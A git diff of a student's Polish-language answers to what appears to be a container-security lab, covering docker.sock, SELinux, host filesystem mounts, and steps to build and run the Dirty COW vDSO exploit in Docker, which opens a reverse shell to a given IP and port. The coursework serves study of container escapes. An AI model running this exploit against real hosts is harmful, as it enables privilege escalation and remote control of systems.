@@ -70,5 +70,33 @@ int main(int argc, char* argv[], char *envp[]){
 
 
 3.
-a) plik /var/run/docker.sock jest domyślnym socketem unixowym na którym nasłuchuje daemon Dockera, i może być wykorzystywany do komunikacji z dameonem wewnątrz określonego kontera.
+a) plik /var/run/docker.sock jest domyślnym socketem unixowym na którym nasłuchuje daemon Dockera, i może być wykorzystywany do komunikacji z dameonem wewnątrz określonego kontenera.
+b) SELinux pełni rolę systemu kontroli dostępu do plików. Z włączonym użytkownik kontenera ma dostęp tylko do tych plików, na które SELinuch mu pozwoli. Bez tego kontenery mają dostęp do wszytkiego (w szczególności mogą montować u siebie dowolne, nawet docelowo zastrzeżone, katalogi).
+c) niebezpieczeństwo polega na tym, że użytkownik ma dostęp do całego systemu pliku hosta w katalogu /mnt w kontenerze
+
+4. 
+żeby odpalić ten kontener pobieramy repo, i wykonujemy po kolei w pobranym katalogu:
+docker build -t dirtycow .
+żeby odpalić kontener:
+sudo docker run -it dirtycow /bin/bash
+
+pojawia się prompt ubuntu :( 
+wykonujemy: cd /dirtycow-vdso
+sprawdzamy ip-ka: ifconfig
+potem są chyba 2 opcje:
+- albo kodujemy w little endian ip i port 1234, odalamy po kolei: 
+make
+./0xdeadbeef
+- albo wykonujemy bez kodowania 
+make
+./0xdeadbeef ip:1234
+exploit powinien zadziałać 
+żeby zapobiec, powinna pomóc komenda:
+sudo docker run -it --ipc="none" dirtycow /bin/bash
+
+a) Exploit potrzebuje wystawiony port, żeby otworzyć "reverse TCP connection" mające służyć jako shell dla zahardkodowanego ip 
+b)
+
+
+
 
